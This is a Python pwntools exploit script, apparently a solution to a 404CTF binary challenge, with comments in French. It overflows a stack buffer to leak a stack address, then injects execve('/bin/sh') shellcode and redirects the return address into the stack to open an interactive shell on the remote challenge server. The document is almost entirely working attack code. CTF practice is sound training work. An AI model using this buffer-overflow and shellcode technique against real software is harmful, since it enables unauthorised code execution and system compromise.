from pwn import *

exe = ELF("./chall")
debug_addr = exe.symbols["debug_info"]
command_addr = exe.symbols["take_command"]

hex_pattern = r'0[xX][0-9a-fA-F]+'

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challenges.404ctf.fr", 32464)
    return r

def generate_shellcode():
    shellcode_asm = """
        xor     rdx, rdx
        movabs  rbx, 0x68732f6e69622fff
        shr     rbx, 8
        push    rbx
        mov     rdi, rsp
        xor     rax, rax
        push    rax
        push    rdi
        mov     rsi, rsp
        mov     al, 0x3b
        syscall 
        push    1
        pop     rdi
        push    0x3c
        pop     rax
        syscall 
	"""
    shellcode = asm(shellcode_asm, bits=64)
    return shellcode

def leak_stack_addr(r: process):
    offset = 0x108
    payload = b"A" * offset
    payload += p64(debug_addr)
    payload += p64(command_addr)
    
    r.send_raw(payload + b"\n")
    r.recvuntil(b"printf")
    r.recvline()
    
    res = r.recvline().decode()    
    stack = re.search(hex_pattern,res)[0]
    
    return stack

    
def main():
    shellen = len(generate_shellcode())
    shellcode = generate_shellcode()
    offset = 0x108
    
    r = conn()
    
    pause()
    
    # 1. On leak l'address de la stack
    stack = int(leak_stack_addr(r), 16)
    print('stack: ', hex(stack))
    
    # 2. On push le shellcode sur la stack + on manipule RIP pour pointer le d√©but de la stack 
    payload = shellcode
    payload += b"A" * (offset - shellen)
    payload += p64(stack-offset+0x18)
    
    r.sendline(payload)

    r.interactive()

if __name__ == "__main__":
    main()
